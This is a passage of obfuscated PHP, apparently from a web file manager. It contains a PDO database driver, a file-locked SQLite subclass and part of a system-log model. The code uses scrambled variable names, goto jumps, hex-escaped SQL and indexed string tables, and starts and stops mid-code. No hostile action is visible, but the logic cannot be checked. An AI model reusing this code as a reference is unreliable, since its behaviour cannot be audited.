!empty($Aê‰¨â…’Œ[$b‡ƒ²ĞôÀ[13]][$b‡ƒ²ĞôÀ[14]]) ? $Aê‰¨â…’Œ[$b‡ƒ²ĞôÀ[13]][$b‡ƒ²ĞôÀ[14]] : $this->pconnect; if ($aÓ·¡ªğĞ) { $Aê‰¨â…’Œ[$b‡ƒ²ĞôÀ[13]][PDO::ATTR_PERSISTENT] = !0; } goto CÚÕÖ Øâå; aáŸê­…¿¨: if (1 != think_config($b‡ƒ²ĞôÀ[18])) { unset($this->config); } goto b×¼ìˆÉ£ ; b×¼ìˆÉ£ : } return $this->linkID[$BùéÑ¼ÅÅ±]; } public function free() { $this->PDOStatement = null; } public function query($e³‰Õ‚ÓŒ², $bù¸”Úóò± = array()) { goto aÖ•í†µ®; Dõ‰éÚ©º¾: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $A·Á¹ÙÅ = $this->PDOStatement->execute($bù¸”Úóò±); $this->debug(); goto F”†ô¼÷†ï; F”†ô¼÷†ï: if (!1 === $A·Á¹ÙÅ) { $this->error(); return !1; } else { return $this->getAll(); } goto FˆÑ‹À·Õ; b†µ­Œ­Úô: think_action_status($AÄŒğñÑøê[19], 1); think_status($AÄŒğñÑøê[20]); $this->PDOStatement = $this->_linkID->prepare($e³‰Õ‚ÓŒ²); goto Dõ‰éÚ©º¾; fÓÈ‡¦œ: $this->queryStr = $e³‰Õ‚ÓŒ²; if (!empty($bù¸”Úóò±)) { $this->queryStr .= $AÄŒğñÑøê[867] . print_r($bù¸”Úóò±, !0) . $AÄŒğñÑøê[868]; } if (!empty($this->PDOStatement)) { $this->free(); } goto b†µ­Œ­Úô; aÖ•í†µ®: $AÄŒğñÑøê =& $_SERVER[ÉóçÄÇ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto fÓÈ‡¦œ; FˆÑ‹À·Õ: } public function execute($B ïŸŞ¤Ô÷, $a¸óò¹ÉÜÇ = array()) { goto aÛ¹ô—ÙÜÚ; aÛ¹ô—ÙÜÚ: $b¦ßÇ®Ş¥ =& $_SERVER[ÉóçÄÇ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto díè‡¾ˆã; E¶ç×Ï¾è¢: if ($this->dbType == $b¦ßÇ®Ş¥[861]) { if (preg_match($b¦ßÇ®Ş¥[869], $this->queryStr, $fì´“ÔÚ)) { $this->table = think_config($b¦ßÇ®Ş¥[870]) . str_ireplace(think_config($b¦ßÇ®Ş¥[871]), $b¦ßÇ®Ş¥[373], $fì´“ÔÚ[2]); $Cƒªµ¬‰…¢ = (bool) $this->query($b¦ßÇ®Ş¥[872] . strtoupper($this->table) . $b¦ßÇ®Ş¥[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($b¦ßÇ®Ş¥[21], 1); goto B¥ˆ¦«£Â; díè‡¾ˆã: $this->queryStr = $B ïŸŞ¤Ô÷; if (!empty($a¸óò¹ÉÜÇ)) { $this->queryStr .= $b¦ßÇ®Ş¥[867] . print_r($a¸óò¹ÉÜÇ, !0) . $b¦ßÇ®Ş¥[868]; } $Cƒªµ¬‰…¢ = !1; goto E¶ç×Ï¾è¢; B¥ˆ¦«£Â: think_status($b¦ßÇ®Ş¥[20]); $this->PDOStatement = $this->_linkID->prepare($B ïŸŞ¤Ô÷); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto C²Šğ“Ìˆ; C²Šğ“Ìˆ: $A‰˜íè»¿“ = $this->PDOStatement->execute($a¸óò¹ÉÜÇ); $this->debug(); if (!1 === $A‰˜íè»¿“) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($Cƒªµ¬‰…¢ || preg_match($b¦ßÇ®Ş¥[873], $B ïŸŞ¤Ô÷)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto bÜÀº­¯Ş; bÜÀº­¯Ş: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $FÖÎ½´ÆËµ = $this->_linkID->commit(); $this->transTimes = 0; if (!$FÖÎ½´ÆËµ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $DùùÏªøæ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$DùùÏªøæ) { $this->error(); return !1; } } return !0; } private function getAll() { $eÙ°–˜‚È  = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($eÙ°–˜‚È ); return $eÙ°–˜‚È ; } public function getFields($A¢İåØÜµæ) { goto D«ï×šÀ»; d•©§ö‡ï‹: $Aò‚ñŒÁ»â = $this->query($eº¬Å‰î­); $B»ƒ¡á¤Ö± = array(); if ($Aò‚ñŒÁ»â) { foreach ($Aò‚ñŒÁ»â as $a“¨ù¸«Á => $CèÓ¢Ï´Îï) { $CèÓ¢Ï´Îï = array_change_key_case($CèÓ¢Ï´Îï); $CèÓ¢Ï´Îï[$Cİœæ¿™Ä†[28]] = isset($CèÓ¢Ï´Îï[$Cİœæ¿™Ä†[28]]) ? $CèÓ¢Ï´Îï[$Cİœæ¿™Ä†[28]] : $Cİœæ¿™Ä†[373]; $CèÓ¢Ï´Îï[$Cİœæ¿™Ä†[29]] = isset($CèÓ¢Ï´Îï[$Cİœæ¿™Ä†[29]]) ? $CèÓ¢Ï´Îï[$Cİœæ¿™Ä†[29]] : $Cİœæ¿™Ä†[373]; $aÎÌôß¡Ñ = isset($CèÓ¢Ï´Îï[$Cİœæ¿™Ä†[269]]) ? $CèÓ¢Ï´Îï[$Cİœæ¿™Ä†[269]] : $CèÓ¢Ï´Îï[$Cİœæ¿™Ä†[28]]; $B»ƒ¡á¤Ö±[$aÎÌôß¡Ñ] = array($Cİœæ¿™Ä†[28] => $aÎÌôß¡Ñ, $Cİœæ¿™Ä†[29] => $CèÓ¢Ï´Îï[$Cİœæ¿™Ä†[29]], $Cİœæ¿™Ä†[31] => (bool) (isset($CèÓ¢Ï´Îï[$Cİœæ¿™Ä†[102]]) && $CèÓ¢Ï´Îï[$Cİœæ¿™Ä†[102]] === $Cİœæ¿™Ä†[33] || isset($CèÓ¢Ï´Îï[$Cİœæ¿™Ä†[31]]) && $CèÓ¢Ï´Îï[$Cİœæ¿™Ä†[31]] === $Cİœæ¿™Ä†[33]), $Cİœæ¿™Ä†[34] => isset($CèÓ¢Ï´Îï[$Cİœæ¿™Ä†[34]]) ? $CèÓ¢Ï´Îï[$Cİœæ¿™Ä†[34]] : (isset($CèÓ¢Ï´Îï[$Cİœæ¿™Ä†[53]]) ? $CèÓ¢Ï´Îï[$Cİœæ¿™Ä†[53]] : $Cİœæ¿™Ä†[373]), $Cİœæ¿™Ä†[36] => isset($CèÓ¢Ï´Îï[$Cİœæ¿™Ä†[92]]) ? strtolower($CèÓ¢Ï´Îï[$Cİœæ¿™Ä†[92]]) == $Cİœæ¿™Ä†[38] : (isset($CèÓ¢Ï´Îï[$Cİœæ¿™Ä†[54]]) ? $CèÓ¢Ï´Îï[$Cİœæ¿™Ä†[54]] : !1), $Cİœæ¿™Ä†[39] => isset($CèÓ¢Ï´Îï[$Cİœæ¿™Ä†[890]]) ? strtolower($CèÓ¢Ï´Îï[$Cİœæ¿™Ä†[890]]) == $Cİœæ¿™Ä†[41] : (isset($CèÓ¢Ï´Îï[$Cİœæ¿™Ä†[92]]) ? $CèÓ¢Ï´Îï[$Cİœæ¿™Ä†[92]] : !1)); } } goto bõãºšƒŸ…; D«ï×šÀ»: $Cİœæ¿™Ä† =& $_SERVER[ÉóçÄÇ]; $this->initConnect(!0); if (think_config($Cİœæ¿™Ä†[874])) { $eº¬Å‰î­ = str_replace($Cİœæ¿™Ä†[875], $A¢İåØÜµæ, think_config($Cİœæ¿™Ä†[874])); } else { switch ($this->dbType) { case $Cİœæ¿™Ä†[858]: case $Cİœæ¿™Ä†[876]: $eº¬Å‰î­ = "\123\x45\x4c\x45\x43\124\40\40\x20\x63\x6f\154\165\x6d\x6e\137\x6e\141\155\x65\x20\x61\163\x20\47\116\x61\x6d\145\x27\54\x20\40\x20\144\141\x74\141\x5f\164\171\160\x65\40\141\163\40\47\124\x79\x70\x65\47\x2c\x20\40\x20\x63\x6f\x6c\x75\155\x6e\x5f\144\x65\146\141\x75\x6c\x74\40\141\163\x20\47\104\145\146\141\x75\154\164\47\54\40\x20\x20\x69\163\137\156\165\x6c\x6c\141\x62\154\x65\40\x61\163\40\x27\x4e\165\x6c\x6c\x27\12\11\x9\106\122\117\115\11\151\156\x66\x6f\x72\155\x61\164\x69\157\x6e\137\163\x63\150\x65\x6d\x61\56\x74\x61\142\x6c\x65\163\x20\101\123\x20\x74\xa\11\11\112\x4f\x49\116\11\151\x6e\146\x6f\162\155\x61\164\x69\x6f\156\x5f\163\x63\150\145\x6d\141\x2e\143\157\x6c\165\x6d\156\163\x20\x41\123\40\x63\12\x9\11\x4f\x4e\x20\40\164\x2e\164\x61\142\x6c\x65\137\x63\141\164\141\x6c\157\x67\40\75\x20\x63\x2e\x74\141\142\x6c\x65\x5f\x63\x61\164\x61\154\x6f\x67\12\x9\x9\x41\x4e\104\40\164\56\164\141\142\154\145\137\163\x63\150\145\155\x61\x20\x3d\x20\143\x2e\x74\141\x62\154\x65\137\x73\143\x68\145\x6d\x61\12\11\x9\x41\116\104\40\x74\x2e\x74\x61\x62\x6c\145\x5f\156\x61\x6d\x65\40\x3d\40\x63\x2e\x74\x61\x62\154\x65\137\156\141\155\145\12\x9\x9\x57\x48\105\x52\105\40\x20\x20\164\x2e\x74\x61\x62\x6c\x65\x5f\156\x61\155\x65\40\x3d\x20\47{$A¢İåØÜµæ}\x27"; break; case $Cİœæ¿™Ä†[877]: $eº¬Å‰î­ = $Cİœæ¿™Ä†[878] . $A¢İåØÜµæ . $Cİœæ¿™Ä†[879]; break; case $Cİœæ¿™Ä†[859]: case $Cİœæ¿™Ä†[861]: $eº¬Å‰î­ = $Cİœæ¿™Ä†[880] . $Cİœæ¿™Ä†[881] . $Cİœæ¿™Ä†[882] . strtoupper($A¢İåØÜµæ) . $Cİœæ¿™Ä†[883] . strtoupper($A¢İåØÜµæ) . $Cİœæ¿™Ä†[884]; break; case $Cİœæ¿™Ä†[885]: $eº¬Å‰î­ = $Cİœæ¿™Ä†[886] . $A¢İåØÜµæ . $Cİœæ¿™Ä†[887]; break; case $Cİœæ¿™Ä†[860]: break; case $Cİœæ¿™Ä†[888]: default: $eº¬Å‰î­ = $Cİœæ¿™Ä†[889] . ($this->dbType == $Cİœæ¿™Ä†[888] ? "\140{$A¢İåØÜµæ}\140" : $A¢İåØÜµæ); } } goto d•©§ö‡ï‹; bõãºšƒŸ…: return $B»ƒ¡á¤Ö±; goto dåòî«¿Î¿; dåòî«¿Î¿: } public function getTables($F‹š†¶Üö” = '') { $b›¬ĞÙ‘æ” =& $_SERVER[ÉóçÄÇ]; if (think_config($b›¬ĞÙ‘æ”[891])) { $B§ø†´Å™ = str_replace($b›¬ĞÙ‘æ”[892], $F‹š†¶Üö”, think_config($b›¬ĞÙ‘æ”[891])); } else { switch ($this->dbType) { case $b›¬ĞÙ‘æ”[859]: case $b›¬ĞÙ‘æ”[861]: $B§ø†´Å™ = $b›¬ĞÙ‘æ”[893]; break; case $b›¬ĞÙ‘æ”[858]: case $b›¬ĞÙ‘æ”[876]: $B§ø†´Å™ = $b›¬ĞÙ‘æ”[894]; break; case $b›¬ĞÙ‘æ”[885]: $B§ø†´Å™ = $b›¬ĞÙ‘æ”[895]; break; case $b›¬ĞÙ‘æ”[860]: think_exception(think_lang($b›¬ĞÙ‘æ”[896]) . $b›¬ĞÙ‘æ”[897]); break; case $b›¬ĞÙ‘æ”[877]: $B§ø†´Å™ = $b›¬ĞÙ‘æ”[42] . $b›¬ĞÙ‘æ”[43] . $b›¬ĞÙ‘æ”[44]; break; case $b›¬ĞÙ‘æ”[888]: default: if (!empty($F‹š†¶Üö”)) { $B§ø†´Å™ = $b›¬ĞÙ‘æ”[841] . $F‹š†¶Üö” . $b›¬ĞÙ‘æ”[842]; } else { $B§ø†´Å™ = $b›¬ĞÙ‘æ”[843]; } } } $F§Ì¯ß·½í = $this->query($B§ø†´Å™); $EÃÏ›¾ï…ì = array(); foreach ($F§Ì¯ß·½í as $A‘É°œß• => $C¤‹„ÅñÆè) { $EÃÏ›¾ï…ì[$A‘É°œß•] = current($C¤‹„ÅñÆè); } return $EÃÏ›¾ï…ì; } protected function parseLimit($Bñ¼è’¥ÆĞ) { $fˆä¶™ˆ¾î =& $_SERVER[ÉóçÄÇ]; $BÍÊø°áã = $fˆä¶™ˆ¾î[33]; if (!empty($Bñ¼è’¥ÆĞ)) { switch ($this->dbType) { case $fˆä¶™ˆ¾î[885]: case $fˆä¶™ˆ¾î[877]: $Bñ¼è’¥ÆĞ = explode($fˆä¶™ˆ¾î[47], $Bñ¼è’¥ÆĞ); if (count($Bñ¼è’¥ÆĞ) > 1) { $BÍÊø°áã .= $fˆä¶™ˆ¾î[48] . $Bñ¼è’¥ÆĞ[1] . $fˆä¶™ˆ¾î[49] . $Bñ¼è’¥ÆĞ[0] . $fˆä¶™ˆ¾î[50]; } else { $BÍÊø°áã .= $fˆä¶™ˆ¾î[48] . $Bñ¼è’¥ÆĞ[0] . $fˆä¶™ˆ¾î[50]; } break; case $fˆä¶™ˆ¾î[858]: case $fˆä¶™ˆ¾î[876]: break; case $fˆä¶™ˆ¾î[860]: break; case $fˆä¶™ˆ¾î[859]: case $fˆä¶™ˆ¾î[861]: break; case $fˆä¶™ˆ¾î[888]: default: $BÍÊø°áã .= $fˆä¶™ˆ¾î[48] . $Bñ¼è’¥ÆĞ . $fˆä¶™ˆ¾î[50]; } } return $BÍÊø°áã; } public function parseKey(&$c¦ÃöºœÀ‘, $bŠÇÜÊ­ˆ¡ = true) { $c˜ôÙ—á¨ =& $_SERVER[ÉóçÄÇ]; if ($bŠÇÜÊ­ˆ¡) { $c¦ÃöºœÀ‘ = $this->parseKeyCheck($c¦ÃöºœÀ‘); } if ($this->dbType == $c˜ôÙ—á¨[888]) { if ($c¦ÃöºœÀ‘ != $c˜ôÙ—á¨[182] && !preg_match($c˜ôÙ—á¨[853], $c¦ÃöºœÀ‘)) { $c¦ÃöºœÀ‘ = $c˜ôÙ—á¨[380] . trim($c¦ÃöºœÀ‘, $c˜ôÙ—á¨[380]) . $c˜ôÙ—á¨[380]; } return $c¦ÃöºœÀ‘; } else { return parent::parseKey($c¦ÃöºœÀ‘); } } public function close() { $this->_linkID = null; } public function error() { $e’Óò†µõ =& $_SERVER[ÉóçÄÇ]; if ($this->PDOStatement) { $DåŒó÷ˆÍ = $this->PDOStatement->errorInfo(); $this->error = $DåŒó÷ˆÍ[1] . $e’Óò†µõ[4] . $DåŒó÷ˆÍ[2]; } else { $this->error = $e’Óò†µõ[33]; } if ($e’Óò†µõ[33] != $this->queryStr) { $this->error .= LNG($e’Óò†µõ[45]) . $this->queryStr; } think_trace($this->error, $e’Óò†µõ[33], $e’Óò†µõ[46]); return $this->error; } public function escapeString($F„±Ê÷—Å¯) { $Fò÷´ğÀ¦Œ =& $_SERVER[ÉóçÄÇ]; switch ($this->dbType) { case $Fò÷´ğÀ¦Œ[885]: case $Fò÷´ğÀ¦Œ[858]: case $Fò÷´ğÀ¦Œ[876]: case $Fò÷´ğÀ¦Œ[888]: return addslashes($F„±Ê÷—Å¯); case $Fò÷´ğÀ¦Œ[860]: case $Fò÷´ğÀ¦Œ[877]: case $Fò÷´ğÀ¦Œ[859]: case $Fò÷´ğÀ¦Œ[861]: return str_ireplace($Fò÷´ğÀ¦Œ[55], $Fò÷´ğÀ¦Œ[56], $F„±Ê÷—Å¯); } } protected function parseValue($f’´£•ŸøÆ) { $a¾õùÕôù =& $_SERVER[ÉóçÄÇ]; if (is_string($f’´£•ŸøÆ)) { $f’´£•ŸøÆ = strpos($f’´£•ŸøÆ, $a¾õùÕôù[4]) === 0 ? $this->escapeString($f’´£•ŸøÆ) : $a¾õùÕôù[898] . $this->escapeString($f’´£•ŸøÆ) . $a¾õùÕôù[898]; } elseif (isset($f’´£•ŸøÆ[0]) && is_string($f’´£•ŸøÆ[0]) && strtolower($f’´£•ŸøÆ[0]) == $a¾õùÕôù[293]) { $f’´£•ŸøÆ = $this->escapeString($f’´£•ŸøÆ[1]); } elseif (is_array($f’´£•ŸøÆ)) { $f’´£•ŸøÆ = array_map(array($this, $a¾õùÕôù[899]), $f’´£•ŸøÆ); } elseif (is_bool($f’´£•ŸøÆ)) { $f’´£•ŸøÆ = $f’´£•ŸøÆ ? $a¾õùÕôù[86] : $a¾õùÕôù[491]; } elseif (is_null($f’´£•ŸøÆ)) { $f’´£•ŸøÆ = $a¾õùÕôù[102]; } return $f’´£•ŸøÆ; } public function getLastInsertId() { $cßËœ®—¢² =& $_SERVER[ÉóçÄÇ]; switch ($this->dbType) { case $cßËœ®—¢²[885]: case $cßËœ®—¢²[877]: case $cßËœ®—¢²[858]: case $cßËœ®—¢²[876]: case $cßËœ®—¢²[860]: case $cßËœ®—¢²[888]: return $this->_linkID->lastInsertId(); case $cßËœ®—¢²[859]: case $cßËœ®—¢²[861]: $DÎ‘ê‡ß†Â = $this->table; $AöÆ±»¡ôİ = $this->query("\x53\105\x4c\105\103\124\x20{$DÎ‘ê‡ß†Â}\56\143\165\162\x72\x76\x61\x6c\x20\x63\x75\162\x72\x76\x61\154\40\x46\122\x4f\x4d\40\x64\x75\x61\x6c"); return $AöÆ±»¡ôİ ? $AöÆ±»¡ôİ[0][$cßËœ®—¢²[900]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($céØ„…Êé) { $Bõì™ÜÙî =& $_SERVER[ÉóçÄÇ]; if (!CacheLock::fileLock($Bõì™ÜÙî[9])) { return !1; } $d¾æåƒ¯‘ö = parent::query($céØ„…Êé); CacheLock::fileUnLock($Bõì™ÜÙî[9]); return $d¾æåƒ¯‘ö; } public function execute($Dš·âò¤©) { $dƒˆ®­êĞ =& $_SERVER[ÉóçÄÇ]; if (!CacheLock::fileLock($dƒˆ®­êĞ[9])) { return !1; } $dÅ¿ÄÖŒ´§ = parent::execute($Dš·âò¤©); CacheLock::fileUnLock($dƒˆ®­êĞ[9]); return $dÅ¿ÄÖŒ´§; } } goto D¦«„µÆ‡; Eæ„•áÎ×ò: class SystemLogModel extends ModelBase { protected $tableName = "\163\171\163\164\145\x6d\137\154\x6f\147"; protected $dataAuto = array(array("\x63\162\145\x61\x74\x65\124\x69\155\145", "\x74\x69\x6d\145", "\x69\x6e\x73\145\162\164", "\x66\165\156\143\x74\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $BÓ‘ïÁš‚À =& $_SERVER[ÉóçÄÇ]; return array($BÓ‘ïÁš‚À[1986] => LNG($BÓ‘ïÁš‚À[1987]), $BÓ‘ïÁš‚À[1988] => LNG($BÓ‘ïÁš‚À[1989]), $BÓ‘ïÁš‚À[1614] => LNG($BÓ‘ïÁš‚À[1990]), $BÓ‘ïÁš‚À[1991] => LNG($BÓ‘ïÁš‚À[1992]), $BÓ‘ïÁš‚À[1993] => LNG($BÓ‘ïÁš‚À[1994]), $BÓ‘ïÁš‚À[1995] => LNG($BÓ‘ïÁš‚À[1996]), $BÓ‘ïÁš‚À[1997] => LNG($BÓ‘ïÁš‚À[1998]), $BÓ‘ïÁš‚À[1644] => LNG($BÓ‘ïÁš‚À[1998]), $BÓ‘ïÁš‚À[1645] => LNG($BÓ‘ïÁš‚À[1999]), $BÓ‘ïÁš‚À[2000] => LNG($BÓ‘ïÁš‚À[2001]), $BÓ‘ïÁš‚À[2002] => LNG($BÓ‘ïÁš‚À[2003]), $BÓ‘ïÁš‚À[2004] => LNG($BÓ‘ïÁš‚À[2005]), $BÓ‘ïÁš‚À[2006] => LNG($BÓ‘ïÁš‚À[2007]), $BÓ‘ïÁš‚À[1642] => LNG($BÓ‘ïÁš‚À[2008]), $BÓ‘ïÁš‚À[1649] => LNG($BÓ‘ïÁš‚À[2009]), $BÓ‘ïÁš‚À[2010] => LNG($BÓ‘ïÁš‚À[2011]), $BÓ‘ïÁš‚À[2012] => LNG($BÓ‘ïÁš‚À[2013]), $BÓ‘ïÁš‚À[2014] => LNG($BÓ‘ïÁš‚À[2015]), $BÓ‘ïÁš‚À[2016] => LNG($BÓ‘ïÁš‚À[2017]), $BÓ‘ïÁš‚À[1652] => LNG($BÓ‘ïÁš‚À[2018]), $BÓ‘ïÁš‚À[1653] => LNG($BÓ‘ïÁš‚À[2019]), $BÓ‘ïÁš‚À[2020] => LNG($BÓ‘ïÁš‚À[2021]), $BÓ‘ïÁš‚À[2022] => LNG($BÓ‘ïÁš‚À[2023]), $BÓ‘ïÁš‚À[2024] => LNG($BÓ‘ïÁš‚À[2025]), $BÓ‘ïÁš‚À[1647] => LNG($BÓ‘ïÁš‚À[2026]), $BÓ‘ïÁš‚À[2027] => LNG($BÓ‘ïÁš‚À[2028]), $BÓ‘ïÁš‚À[1646] => LNG($BÓ‘ïÁš‚À[2029]), $BÓ‘ïÁš‚À[2030] => LNG($BÓ‘ïÁš‚À[2031]), $BÓ‘ïÁš‚À[2032] => LNG($BÓ‘ïÁš‚À[2033]), $BÓ‘ïÁš‚À[2034] => LNG($BÓ‘ïÁš‚À[2034]), $BÓ‘ïÁš‚À[2035] => LNG($BÓ‘ïÁš‚À[2035]), $BÓ‘ïÁš‚À[2036] => LNG($BÓ‘ïÁš‚À[1618]), $BÓ‘ïÁš‚À[2037] => LNG($BÓ‘ïÁš‚À[2038]), $BÓ‘ïÁš‚À[2039] => LNG($BÓ‘ïÁš‚À[2040]), $BÓ‘ïÁš‚À[2041] => LNG($BÓ‘ïÁš‚À[2042]), $BÓ‘ïÁš‚À[2043] => LNG($BÓ‘ïÁš‚À[2044]), $BÓ‘ïÁš‚À[2045] => LNG($BÓ‘ïÁš‚À[2046]), $BÓ‘ïÁš‚À[2047] => LNG($BÓ‘ïÁš‚À[2047]), $BÓ‘ïÁš‚À[2048] => LNG($BÓ‘ïÁš‚À[2049]), $BÓ‘ïÁš‚À[2050] => LNG($BÓ‘ïÁš‚À[2051]), $BÓ‘ïÁš‚À[2052] => LNG($BÓ‘ïÁš‚À[2053]), $BÓ‘ïÁš‚À[2054] => LNG($BÓ‘ïÁš‚À[2055]), $BÓ‘ïÁš‚À[2056] => LNG($BÓ‘ïÁš‚À[2057]), $BÓ‘ïÁš‚À[2058] => LNG($BÓ‘ïÁš‚À[2059])); } private function typeFile() { $dÕ±Ê“¸ê‰ =& $_SERVER[ÉóçÄÇ]; $cÛ¯®¼×Ï = array($dÕ±Ê“¸ê‰[1649] => array($dÕ±Ê“¸ê‰[1650]), $dÕ±Ê“¸ê‰[2004] => array($dÕ±Ê“¸ê‰[2060]), $dÕ±Ê“¸ê‰[2006] => array($dÕ±Ê“¸ê‰[2061]), $dÕ±Ê“¸ê‰[1642] => array($dÕ±Ê“¸ê‰[1643]), $dÕ±Ê“¸ê‰[2012] => array(), $dÕ±Ê“¸ê‰[2014] => array(), $dÕ±Ê“¸ê‰[2016] => array(), $dÕ±Ê“¸ê‰[1652] => array($dÕ±Ê“¸ê‰[1654]), $dÕ±Ê“¸ê‰[1653] => array($dÕ±Ê“¸ê‰[1654]), $dÕ±Ê“¸ê‰[2020] => array($dÕ±Ê“¸ê‰[2062]), $dÕ±Ê“¸ê‰[2022] => array($dÕ±Ê“¸ê‰[2062]), $dÕ±Ê“¸ê‰[2024] => array($dÕ±Ê“¸ê‰[2063]), $dÕ±Ê“¸ê‰[2010] => array($dÕ±Ê“¸ê‰[2064]), $dÕ±Ê“¸ê‰[1647] => array($dÕ±Ê“¸ê‰[2065]), $dÕ±Ê“¸ê‰[2027] => array($dÕ±Ê“¸ê‰[2066]), $dÕ±Ê“¸ê‰[1646] => array($dÕ±Ê“¸ê‰[1648])); return $cÛ¯®¼×Ï; } private function typeAll() { goto EîàÑ‚çùó; EîàÑ‚çùó: $C…ªô³Ëïà =& $_SERVER[ÉóçÄÇ]; $Fá£Ä†˜¦¼ = $this->typeList; $Aåàˆ…Ó†´ = array_filter($this->typeFile()); goto fØÙ‘…Ì¬Ò; FÁÃô£òÍ«: return $Fá£Ä†˜¦¼; goto FÔÈâ÷•…Š; fØÙ‘…Ì¬Ò: foreach ($Aåàˆ…Ó†´ as $c„•×ƒËØ© => $c×Óğ’ø) { $Fá£Ä†˜¦¼[$c×Óğ’ø[0]] = $Fá£Ä†˜¦¼[$c„•×ƒËØ©]; } $Fá£Ä†˜¦¼[$C…ªô³Ëïà[1654]] = LNG($C…ªô³Ëïà[2067]); $Fá£Ä†˜¦¼[$C…ªô³Ëïà[2062]] = LNG($C…ªô³Ëïà[2068]); goto FÁÃô£òÍ«; FÔÈâ÷•…Š: } public function addLog($E»Ğ¿Ì¾‚“, $aÈç……ãŸª = array()) { goto a…ß†Š—ßš; d¬ÊÄ…ªñ§: if (!$f´å‹“½ƒ‰) { $f´å‹“½ƒ‰ = (int) Session::get($E¼¡¨¥æåÌ[1801]); } $b°Ş¸Œ = get_client_ip(); if (!$aÈç……ãŸª || strlen(json_encode($aÈç……ãŸª)) >= 1024) { $aÈç……ãŸª = array($E¼¡¨¥æåÌ[2069] => $b°Ş¸Œ); } else { if (is_array($aÈç……ãŸª)) { $aÈç……ãŸª[$E¼¡¨¥æåÌ[2069]] = $b°Ş¸Œ; } else { $aÈç……ãŸª = array($E¼¡¨¥æåÌ[1070] => $aÈç……ãŸª, $E¼¡¨¥æåÌ[2069] => $b°Ş¸Œ); } } goto aœ»–Ö¸; aœ»–Ö¸: $aÈç……ãŸª = array($E¼¡¨¥æåÌ[1502] => Session::sign(), $E¼¡¨¥æåÌ[1503] => $f´å‹“½ƒ‰, $E¼¡¨¥æåÌ[29] => $E»Ğ¿Ì¾‚“, $E¼¡¨¥æåÌ[1505] => json_encode($aÈç……ãŸª)); parent::add($aÈç……ãŸª); goto Få–Â£¿ë°; a…ß†Š—ßš: $E¼¡¨¥æåÌ =& $_SERVER[ÉóçÄÇ]; if (!isset($this->typeList[$E»Ğ¿Ì¾‚“])) { return; } $f´å‹“½ƒ‰ = defined($E¼¡¨¥æåÌ[448]) && USER_ID ? USER_ID : (isset($aÈç……ãŸª[$E¼¡¨¥æåÌ[1511]]) ? $aÈç……ãŸª[$E¼¡¨¥æåÌ[1511]] : 0); goto d¬ÊÄ…ªñ§; Få–Â£¿ë°: } public function remove($FÉëŒŠ«”¯) { $this->where(array($_SERVER[ÉóçÄÇ][406] => $FÉëŒŠ«”¯))->delete(); } private function _makeOrder($B‡£İÖÅ² = '') { goto F•å¤çíå; EÀÔîìŒ: $a¥°ò¥›¹ = Input::get($A‹ÕòÇ‡‚ã[430], $A‹ÕòÇ‡‚ã[7], $A‹ÕòÇ‡‚ã[1833], array($A‹ÕòÇ‡‚ã[1757], $A‹ÕòÇ‡‚ã[424])); $a¥°ò¥›¹ = $DøŒ¤’Ï‹š[$a¥°ò¥›¹]; $B‡£İÖÅ² = $B‡£İÖÅ² . "{$aê™æáš‹}\40{$a¥°ò¥›¹}"; goto b³Ş±Ï¨¹è; b³Ş±Ï¨¹è: return $this->order($B‡£İÖÅ²); goto e‡ÚÅˆ²ë; F•å¤çíå: $A‹ÕòÇ‡‚ã =& $_SERVER[ÉóçÄÇ]; $aê™æáš‹ = $A‹ÕòÇ‡‚ã[192]; $DøŒ¤’Ï‹š = array($A‹ÕòÇ‡‚ã[422] => $A‹ÕòÇ‡‚ã[423], $A‹ÕòÇ‡‚ã[424] => $A‹ÕòÇ‡‚ã[425]); goto EÀÔîìŒ; e‡ÚÅˆ²ë: } public function get($eÂÄíåñéÆ = '') { goto F“Ï¢ğ¢‡; F“Ï¢ğ¢‡: $EØë¨„ÙÂ =& $_SERVER[ÉóçÄÇ]; if (!$eÂÄíåñéÆ) { show_json(array()); } $c–å©Ã¨­ = array(); goto Cì…½íé…†; a…áŒ»³‡¾: if (!empty($eÂÄíåñéÆ[$EØë¨„ÙÂ[2069]])) { $c–å©Ã¨­[$EØë¨„ÙÂ[425]] = array($EØë¨„ÙÂ[378], "\x25{$eÂÄíåñéÆ[$EØë¨„ÙÂ[2069]]}\45"); } $b™å’ µÔ§ = $this->_makeOrder()->where($c–å©Ã¨­)->selectPage(); if (empty($b™å’ µÔ§[$EØë¨„ÙÂ[365]])) { show_json(array(), !0, $b™å’ µÔ§[$EØë¨„ÙÂ[362]]); } goto Bíùê¤’‰¸; Cì…½íé…†: if ($eÂÄíåñéÆ[$EØë¨„ÙÂ[1511]]) { $c–å©Ã¨­[$EØë¨„ÙÂ[1511]] = $eÂÄíåñéÆ[$EØë¨„ÙÂ[1511]]; } if (isset($eÂÄíåñéÆ[$EØë¨„ÙÂ[724]])) { $Aù‡ŞÌ…²ä = $eÂÄíåñéÆ[$EØë¨„ÙÂ[724]]; $EŸ»ÀÑ‚´™ = isset($eÂÄíåñéÆ[$EØë¨„ÙÂ[470]]) ? $eÂÄíåñéÆ[$EØë¨„ÙÂ[470]] : time(); $c–å©Ã¨­[$EØë¨„ÙÂ[192]] = array($EØë¨„ÙÂ[329], array($Aù‡ŞÌ…²ä, $EŸ»ÀÑ‚´™)); } if ($eÂÄíåñéÆ[$EØë¨„ÙÂ[29]]) { $B¶ø‚Ü‰  = explode($EØë¨„ÙÂ[47], $eÂÄíåñéÆ[$EØë¨„ÙÂ[29]]); $aÚÑÚá†„ = $this->typeFile(); $bŒ’›ôŒ¥‚ = array(); foreach ($B¶ø‚Ü‰  as $aÚ¯¾ÈÛ´÷) { $bŒ’›ôŒ¥‚[] = $aÚ¯¾ÈÛ´÷; if 